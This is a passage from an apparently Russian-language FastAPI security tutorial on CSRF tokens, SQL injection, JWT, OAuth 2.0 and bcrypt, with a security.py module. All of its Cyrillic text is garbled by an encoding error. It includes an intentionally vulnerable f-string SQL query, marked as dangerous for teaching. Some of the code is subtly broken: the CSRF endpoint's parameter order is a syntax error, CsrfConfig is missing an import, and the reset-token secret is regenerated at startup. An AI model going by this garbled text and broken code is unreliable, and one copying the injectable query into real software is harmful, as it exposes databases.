# –ö–ª–∏–µ–Ω—Ç –¥–æ–ª–∂–µ–Ω –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –µ–≥–æ –≤ –∑–∞–≥–æ–ª–æ–≤–∫–µ X-CSRF-Token

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
@router.post("/transfer")
async def transfer_money(
    request: Request,
    transfer_data: TransferData
):
    cookie_token = request.cookies.get("csrf_token")
    header_token = request.headers.get("X-CSRF-Token")
    
    if not cookie_token or not header_token:
        raise HTTPException(status_code=403, detail="CSRF token missing")
    
    if cookie_token != header_token:
        raise HTTPException(status_code=403, detail="CSRF token mismatch")
    
    # –¢–æ–∫–µ–Ω—ã —Å–æ–≤–ø–∞–¥–∞—é—Ç - –∑–∞–ø—Ä–æ—Å –ª–µ–≥–∏—Ç–∏–º–Ω—ã–π
    # ... –æ–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–ø—Ä–æ—Å–∞
```

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –¥–ª—è FastAPI:**

**–î–ª—è REST API (JWT —Ç–æ–∫–µ–Ω—ã –≤ –∑–∞–≥–æ–ª–æ–≤–∫–∞—Ö):**
- CSRF –º–µ–Ω–µ–µ –∫—Ä–∏—Ç–∏—á–µ–Ω, —Ç–∞–∫ –∫–∞–∫ —Ç–æ–∫–µ–Ω—ã –Ω–µ –≤ cookies
- –ù–æ –≤—Å–µ —Ä–∞–≤–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä—è—Ç—å Origin –¥–ª—è POST/PUT/DELETE

**–î–ª—è –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π (cookies):**
- –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ CSRF —Ç–æ–∫–µ–Ω—ã –¥–ª—è –≤—Å–µ—Ö –∏–∑–º–µ–Ω—è—é—â–∏—Ö –æ–ø–µ—Ä–∞—Ü–∏–π
- –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ SameSite=Lax –¥–ª—è cookies
- –ü—Ä–æ–≤–µ—Ä—è–π—Ç–µ Origin/Referer –∑–∞–≥–æ–ª–æ–≤–∫–∏
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–∏–±–ª–∏–æ—Ç–µ–∫—É `fastapi-csrf-protect` –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –∑–∞—â–∏—Ç—ã

**–ü—Ä–∏–º–µ—Ä –ø–æ–ª–Ω–æ–π –∑–∞—â–∏—Ç—ã:**
```python
from fastapi_csrf_protect import CsrfProtect
from fastapi_csrf_protect.exceptions import CsrfProtectError
from fastapi import Request

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ CSRF –∑–∞—â–∏—Ç—ã
@CsrfProtect.load_config
def get_csrf_config():
    return CsrfConfig(secret_key=settings.SECRET_KEY)

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫ CSRF
@app.exception_handler(CsrfProtectError)
def csrf_protect_exception_handler(request: Request, exc: CsrfProtectError):
    return JSONResponse(
        status_code=exc.status_code,
        content={"detail": exc.message}
    )

# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ endpoint
@router.post("/transfer")
async def transfer_money(
    request: Request,
    csrf_protect: CsrfProtect = Depends(),
    transfer_data: TransferData
):
    # CSRF —Ç–æ–∫–µ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è
    csrf_protect.validate_csrf(request)
    
    # –ï—Å–ª–∏ –¥–æ—à–ª–∏ —Å—é–¥–∞ - —Ç–æ–∫–µ–Ω –≤–∞–ª–∏–¥–µ–Ω
    # ... –æ–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–ø—Ä–æ—Å–∞
```

#### **5. –ò–Ω—ä–µ–∫—Ü–∏–∏ (SQL Injection, Command Injection)**

**–ß—Ç–æ —ç—Ç–æ:**
- –í–Ω–µ–¥—Ä–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞ –≤ –∑–∞–ø—Ä–æ—Å—ã –∫ –ë–î –∏–ª–∏ –∫–æ–º–∞–Ω–¥—ã —Å–∏—Å—Ç–µ–º—ã
- –ú–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ —É—Ç–µ—á–∫–µ –¥–∞–Ω–Ω—ã—Ö, —É–¥–∞–ª–µ–Ω–∏—é –¥–∞–Ω–Ω—ã—Ö, –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ —Å–µ—Ä–≤–µ—Ä–∞
- –û–¥–Ω–∞ –∏–∑ —Å–∞–º—ã—Ö –æ–ø–∞—Å–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π

**–ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è:**
- **–ü–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã** - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ prepared statements
- **ORM/SQLAlchemy** - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∑–∞—â–∏—Ç–∞ –æ—Ç SQL –∏–Ω—ä–µ–∫—Ü–∏–π
- **–í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö** - –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤—Å–µ—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
- **–ü—Ä–∏–Ω—Ü–∏–ø –Ω–∞–∏–º–µ–Ω—å—à–∏—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π** - –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø—Ä–∞–≤ –ë–î –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

**–ü—Ä–∏–º–µ—Ä –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –∫–æ–¥–∞:**
```python
# ‚ùå –û–ü–ê–°–ù–û - SQL –∏–Ω—ä–µ–∫—Ü–∏—è –≤–æ–∑–º–æ–∂–Ω–∞
query = f"SELECT * FROM users WHERE username = '{username}'"

# ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–û - –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π –∑–∞–ø—Ä–æ—Å
from sqlalchemy import select
query = select(User).where(User.username == username)
result = await db.execute(query)

# ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–û - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
query = text("SELECT * FROM users WHERE username = :username")
result = await db.execute(query, {"username": username})

# ‚úÖ –í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
from pydantic import BaseModel, validator

class UserSearch(BaseModel):
    username: str
    
    @validator('username')
    def validate_username(cls, v):
        # –†–∞–∑—Ä–µ—à–∞–µ–º —Ç–æ–ª—å–∫–æ –±—É–∫–≤—ã, —Ü–∏—Ñ—Ä—ã –∏ –ø–æ–¥—á–µ—Ä–∫–∏–≤–∞–Ω–∏—è
        if not v.replace('_', '').isalnum():
            raise ValueError('Invalid username format')
        if len(v) > 100:
            raise ValueError('Username too long')
        return v
```


### **2. JWT (JSON Web Tokens)**

**–ß—Ç–æ —Ç–∞–∫–æ–µ JWT:**
- –°—Ç–∞–Ω–¥–∞—Ä—Ç –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–π –ø–µ—Ä–µ–¥–∞—á–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –º–µ–∂–¥—É —Å—Ç–æ—Ä–æ–Ω–∞–º–∏
- –°–æ—Å—Ç–æ–∏—Ç –∏–∑ —Ç—Ä–µ—Ö —á–∞—Å—Ç–µ–π: header, payload, signature
- –°–∞–º–æ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω—ã–π (—Å–æ–¥–µ—Ä–∂–∏—Ç –≤—Å—é –Ω–µ–æ–±—Ö–æ–¥–∏–º—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é)
- –ë–µ–∑ —Å–æ—Å—Ç–æ—è–Ω–∏—è (stateless) - –Ω–µ —Ç—Ä–µ–±—É–µ—Ç —Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ

**–ó–∞—á–µ–º –Ω—É–∂–µ–Ω JWT:**
- –ú–∞—Å—à—Ç–∞–±–∏—Ä—É–µ–º–æ—Å—Ç—å (–Ω–µ –Ω—É–∂–Ω–æ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Å–µ—Å—Å–∏–∏ –º–µ–∂–¥—É —Å–µ—Ä–≤–µ—Ä–∞–º–∏)
- –ö—Ä–æ—Åc-–¥–æ–º–µ–Ω–Ω–æ—Å—Ç—å (–ª–µ–≥–∫–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤ –º–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å–∞—Ö)
- –ú–æ–±–∏–ª—å–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è (–ª–µ–≥–∫–æ —Ö—Ä–∞–Ω–∏—Ç—å —Ç–æ–∫–µ–Ω –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ)
- API –¥–ª—è —Å—Ç–æ—Ä–æ–Ω–Ω–∏—Ö —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤

#### **–°—Ç—Ä—É–∫—Ç—É—Ä–∞ JWT:**
```
header.payload.signature

# Header (–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–π Base64)
{
  "alg": "HS256",  # –ê–ª–≥–æ—Ä–∏—Ç–º –ø–æ–¥–ø–∏—Å–∏
  "typ": "JWT"     # –¢–∏–ø —Ç–æ–∫–µ–Ω–∞
}

# Payload (–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–π Base64)
{
  "sub": "1234567890",      # Subject (ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
  "name": "John Doe",
  "iat": 1516239022,        # Issued At (–≤—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è)
  "exp": 1516242622,        # Expiration (–≤—Ä–µ–º—è –∏—Å—Ç–µ—á–µ–Ω–∏—è)
  "role": "admin"           # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
}

# Signature
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret_key
)
```

#### **–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞ JWT:**
- ‚úÖ –°—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π (–Ω–µ —Ç—Ä–µ–±—É–µ—Ç —Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ)
- ‚úÖ –ú–∞—Å—à—Ç–∞–±–∏—Ä—É–µ–º–æ—Å—Ç—å (–Ω–µ –Ω—É–∂–Ω–æ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Å–µ—Å—Å–∏–∏)
- ‚úÖ –ö—Ä–æ—Åc-–¥–æ–º–µ–Ω–Ω–æ—Å—Ç—å (–ª–µ–≥–∫–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤ –º–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å–∞—Ö)

#### **–ù–µ–¥–æ—Å—Ç–∞—Ç–∫–∏ JWT:**
- ‚ùå –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –æ—Ç–æ–∑–≤–∞—Ç—å (—Ç–æ–ª—å–∫–æ —á–µ—Ä–µ–∑ blacklist)
- ‚ùå –ë–æ–ª—å—à–æ–π —Ä–∞–∑–º–µ—Ä (–±–æ–ª—å—à–µ —á–µ–º session ID)
- ‚ùå –†–∏—Å–∫ —É—Ç–µ—á–∫–∏ (—Ö—Ä–∞–Ω–∏—Ç—Å—è —É –∫–ª–∏–µ–Ω—Ç–∞)

#### **–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å JWT:**
- **SECRET_KEY:** –î–æ–ª–∂–µ–Ω –±—ã—Ç—å –º–∏–Ω–∏–º—É–º 32 –±–∞–π—Ç–∞, –ª—É—á—à–µ 48+ (–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ `secrets.token_urlsafe(48)`)
- **–ê–ª–≥–æ—Ä–∏—Ç–º:** HS256 –¥–ª—è —Å–∏–º–º–µ—Ç—Ä–∏—á–Ω–æ–≥–æ (–ø—Ä–æ—â–µ), RS256 –¥–ª—è –∞—Å–∏–º–º–µ—Ç—Ä–∏—á–Ω–æ–≥–æ (–±–µ–∑–æ–ø–∞—Å–Ω–µ–µ –¥–ª—è –º–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å–æ–≤)
- **–•—Ä–∞–Ω–µ–Ω–∏–µ:** –ù–∏–∫–æ–≥–¥–∞ –Ω–µ –∫–æ–º–º–∏—Ç—å—Ç–µ SECRET_KEY –≤ git, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
- **–†–æ—Ç–∞—Ü–∏—è:** –ü–ª–∞–Ω–∏—Ä—É–π—Ç–µ —Ä–æ—Ç–∞—Ü–∏—é –∫–ª—é—á–µ–π –≤ production (–æ—Å–æ–±–µ–Ω–Ω–æ –ø—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏)
- **Expiration:** Access —Ç–æ–∫–µ–Ω—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –∫–æ—Ä–æ—Ç–∫–æ–∂–∏–≤—É—â–∏–º–∏ (15-30 –º–∏–Ω—É—Ç), refresh —Ç–æ–∫–µ–Ω—ã - –¥–æ–ª–≥–æ–∂–∏–≤—É—â–∏–º–∏ (7-30 –¥–Ω–µ–π)
- **HTTPS:** –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ HTTPS –≤ production –¥–ª—è –∑–∞—â–∏—Ç—ã —Ç–æ–∫–µ–Ω–æ–≤ –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ

### **3. OAuth 2.0 –∏ –µ–≥–æ –ø–æ—Ç–æ–∫–∏ (Flows)**

**–ß—Ç–æ —Ç–∞–∫–æ–µ OAuth 2.0:**
- –°—Ç–∞–Ω–¥–∞—Ä—Ç –¥–ª—è –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ä–µ—Å—É—Ä—Å–∞–º
- –ü–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—é –ø–æ–ª—É—á–∞—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ä–µ—Å—É—Ä—Å–∞–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –±–µ–∑ –ø–∞—Ä–æ–ª—è
- –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏ —Å –≤–Ω–µ—à–Ω–∏–º–∏ —Å–µ—Ä–≤–∏—Å–∞–º–∏ (Google, GitHub, Facebook)

**–ó–∞—á–µ–º –Ω—É–∂–µ–Ω OAuth 2.0:**
- –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å (–Ω–µ –Ω—É–∂–Ω–æ —Ö—Ä–∞–Ω–∏—Ç—å –ø–∞—Ä–æ–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)
- –£–¥–æ–±—Å—Ç–≤–æ (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –≤–≤–æ–¥–∏—Ç –ø–∞—Ä–æ–ª—å –≤ —Å—Ç–æ—Ä–æ–Ω–Ω–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏)
- –ì–∏–±–∫–æ—Å—Ç—å (—Ä–∞–∑–Ω—ã–µ –ø–æ—Ç–æ–∫–∏ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö —Ç–∏–ø–æ–≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π)

#### **–û—Å–Ω–æ–≤–Ω—ã–µ —Ä–æ–ª–∏ –≤ OAuth 2.0:**
1. **Resource Owner** - –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å
2. **Client** - –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, –∑–∞–ø—Ä–∞—à–∏–≤–∞—é—â–µ–µ –¥–æ—Å—Ç—É–ø
3. **Authorization Server** - —Å–µ—Ä–≤–µ—Ä –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ (–≤—ã–¥–∞–µ—Ç —Ç–æ–∫–µ–Ω—ã)
4. **Resource Server** - —Å–µ—Ä–≤–µ—Ä —Å –∑–∞—â–∏—â–µ–Ω–Ω—ã–º–∏ —Ä–µ—Å—É—Ä—Å–∞–º–∏ (–Ω–∞—à API)

#### **–ü–æ—Ç–æ–∫–∏ OAuth 2.0:**
1. **Authorization Code Flow** - –¥–ª—è –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π —Å —Å–µ—Ä–≤–µ—Ä–Ω–æ–π —á–∞—Å—Ç—å—é
2. **Implicit Flow** (—É—Å—Ç–∞—Ä–µ–ª) - –¥–ª—è SPA
3. **Resource Owner Password Credentials** - –¥–ª—è –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π (–Ω–∞—à–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ)
4. **Client Credentials Flow** - –¥–ª—è machine-to-machine

#### **Password Flow (ROPC) - –Ω–∞—à –≤—ã–±–æ—Ä –¥–ª—è API:**
```
1. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ‚Üí –ö–ª–∏–µ–Ω—Ç: –ª–æ–≥–∏–Ω/–ø–∞—Ä–æ–ª—å
2. –ö–ª–∏–µ–Ω—Ç ‚Üí Auth Server: –ª–æ–≥–∏–Ω/–ø–∞—Ä–æ–ª—å + client_id/secret
3. Auth Server ‚Üí –ö–ª–∏–µ–Ω—Ç: access_token + refresh_token
4. –ö–ª–∏–µ–Ω—Ç ‚Üí Resource Server: access_token –≤ –∑–∞–≥–æ–ª–æ–≤–∫–µ
5. Resource Server ‚Üí –ö–ª–∏–µ–Ω—Ç: –∑–∞—â–∏—â–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
```

### **4. –•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π**

**–ü—Ä–∏–Ω—Ü–∏–ø—ã:**
- **–û–¥–Ω–æ—Å—Ç–æ—Ä–æ–Ω–Ω–µ–µ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ** ‚Äî –Ω–µ–ª—å–∑—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å –∏–∑ —Ö–µ—à–∞
- **–°–æ–ª—å (salt)** ‚Äî —É–Ω–∏–∫–∞–ª—å–Ω–∞—è —Å–ª—É—á–∞–π–Ω–∞—è —Å—Ç—Ä–æ–∫–∞ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–∞—Ä–æ–ª—è
- **–ú–µ–¥–ª–µ–Ω–Ω—ã–µ –∞–ª–≥–æ—Ä–∏—Ç–º—ã** ‚Äî –∑–∞—â–∏—Ç–∞ –æ—Ç –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞
- **–ê–¥–∞–ø—Ç–∏–≤–Ω—ã–µ –∞–ª–≥–æ—Ä–∏—Ç–º—ã** ‚Äî –º–æ–∂–Ω–æ —É–≤–µ–ª–∏—á–∏—Ç—å —Å–ª–æ–∂–Ω–æ—Å—Ç—å —Å–æ –≤—Ä–µ–º–µ–Ω–µ–º

#### **–ü–æ—á–µ–º—É –Ω–µ —Ö—Ä–∞–Ω–∏—Ç—å –ø–∞—Ä–æ–ª–∏ –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ:**
```python
# –û–ü–ê–°–ù–û!
users = {
    "admin": "password123",  # –ü–∞—Ä–æ–ª—å –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ
    "user1": "qwerty"
}

# –ü—Ä–∏ —É—Ç–µ—á–∫–µ –ë–î –≤—Å–µ –ø–∞—Ä–æ–ª–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω—ã
```

#### **–ê–ª–≥–æ—Ä–∏—Ç–º—ã —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è:**
1. **bcrypt** - —Ä–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω, –º–µ–¥–ª–µ–Ω–Ω—ã–π, —Å —Å–æ–ª—å—é
2. **argon2** - —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π, –ø–æ–±–µ–¥–∏—Ç–µ–ª—å Password Hashing Competition
3. **PBKDF2** - –Ω–∞–¥–µ–∂–Ω—ã–π, –Ω–æ –º–µ–¥–ª–µ–Ω–Ω–µ–µ bcrypt
4. **scrypt** - —Ç—Ä–µ–±—É–µ—Ç –º–Ω–æ–≥–æ –ø–∞–º—è—Ç–∏

#### **–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç bcrypt:**
```python
import bcrypt

# –•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–æ–ª—è
password = "my_password".encode('utf-8')
salt = bcrypt.gensalt(rounds=12)  # –§–∞–∫—Ç–æ—Ä —Å–ª–æ–∂–Ω–æ—Å—Ç–∏
hashed = bcrypt.hashpw(password, salt)  # $2b$12$... (—Å–æ–ª—å + —Ö–µ—à)

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è
bcrypt.checkpw(password, hashed)  # True/False
```

---

## **üîß –ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∞—è —á–∞—Å—Ç—å**

### **1. –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π**

**–î–æ–ø–æ–ª–Ω—è–µ–º requirements.txt:**
```txt
# –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å
python-jose[cryptography]==3.3.0  # JWT
passlib[bcrypt]==1.7.4             # –•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π
python-multipart==0.0.6            # –î–ª—è —Ñ–æ—Ä–º
email-validator==2.1.0             # –í–∞–ª–∏–¥–∞—Ü–∏—è email
pyotp==2.9.0                       # –î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è (TOTP)
qrcode[pil]==7.4.2                 # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è QR –∫–æ–¥–æ–≤ –¥–ª—è 2FA
```

### **2. –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏**

```python
# app/core/security.py
import secrets
from datetime import datetime, timedelta, timezone
from typing import Any, Union, Optional
from jose import JWTError, jwt
from passlib.context import CryptContext
from app.core.config import settings

# –ö–æ–Ω—Ç–µ–∫—Å—Ç –¥–ª—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è –ø–∞—Ä–æ–ª–µ–π
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

# –°–ª—É—á–∞–π–Ω—ã–π —Å–µ–∫—Ä–µ—Ç –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ reset —Ç–æ–∫–µ–Ω–æ–≤
RESET_TOKEN_SECRET = secrets.token_urlsafe(32)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è"""
    return pwd_context.verify(plain_password, hashed_password)

def get_password_hash(password: str) -> str:
    """–•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–æ–ª—è"""
    return pwd_context.hash(password)

def create_access_token(
    subject: Union[str, Any], 
    expires_delta: Optional[timedelta] = None,
    additional_claims: Optional[dict] = None
) -> str:
    """–°–æ–∑–¥–∞–Ω–∏–µ JWT access —Ç–æ–∫–µ–Ω–∞"""
    now = datetime.now(timezone.utc)
    if expires_delta:
        expire = now + expires_delta
    else:
        expire = now + timedelta(
            minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES
        )
    
    to_encode = {
        "exp": expire,
        "sub": str(subject),
        "iat": now,
        "type": "access"
    }
    
    if additional_claims:
        to_encode.update(additional_claims)
    
    encoded_jwt = jwt.encode(
        to_encode, 
        settings.SECRET_KEY, 
        algorithm=settings.ALGORITHM
    )
    return encoded_jwt

def create_refresh_token(
    subject: Union[str, Any],
    expires_delta: Optional[timedelta] = None
) -> str:
    """–°–æ–∑–¥–∞–Ω–∏–µ JWT refresh —Ç–æ–∫–µ–Ω–∞"""
    now = datetime.now(timezone.utc)
    if expires_delta:
        expire = now + expires_delta
    else:
        expire = now + timedelta(days=30)  # 30 –¥–Ω–µ–π
    
    to_encode = {
        "exp": expire,
        "sub": str(subject),
        "iat": now,
        "type": "refresh"
    }
    
    encoded_jwt = jwt.encode(
        to_encode,
        settings.SECRET_KEY,
        algorithm=settings.ALGORITHM
    )
    return encoded_jwt

def verify_token(token: str) -> Optional[dict]:
    """–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è JWT —Ç–æ–∫–µ–Ω–∞"""
    try:
        payload = jwt.decode(
            token, 
            settings.SECRET_KEY, 
            algorithms=[settings.ALGORITHM]
        )
        return payload
    except JWTError:
        return None

def create_password_reset_token(email: str) -> str:
    """–°–æ–∑–¥–∞–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞ –¥–ª—è —Å–±—Ä–æ—Å–∞ –ø–∞—Ä–æ–ª—è"""
    expires = datetime.now(timezone.utc) + timedelta(hours=1)
    to_encode = {
        "exp": expires,
        "sub": email,
        "type": "password_reset"
    }
    
    encoded_jwt = jwt.encode(
        to_encode,
        RESET_TOKEN_SECRET,
        algorithm=settings.ALGORITHM
    )
    return encoded_jwt

def verify_password_reset_token(token: str) -> Optional[str]:
    """–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è —Ç–æ–∫–µ–Ω–∞ —Å–±—Ä–æ—Å–∞ –ø–∞—Ä–æ–ª—è"""
    try:
        payload = jwt.decode(
            token,
            RESET_TOKEN_SECRET,
            algorithms=[settings.ALGORITHM]
        )
        if payload.get("type") != "password_reset":
            return None
        return payload.get("sub")
    except JWTError:
        return None

# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω—ã—Ö –∫–ª—é—á–µ–π –¥–ª—è API
def generate_api_key() -> str:
    """–ì–µ–Ω–µ—Ä–∞—Ü–∏—è API –∫–ª—é—á–∞"""
    return f"sk_live_{secrets.token_urlsafe(32)}"

def generate_secret_key() -> str:
    """–ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞"""
    return secrets.token_urlsafe(48)
```

### **3. –ú–æ–¥–µ–ª–∏ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏**

**–ó–∞—á–µ–º –Ω—É–∂–Ω—ã –º–æ–¥–µ–ª–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏:**
- –•—Ä–∞–Ω–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è—Ö
- –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —Å–µ—Å—Å–∏–π –∏ —Ç–æ–∫–µ–Ω–æ–≤
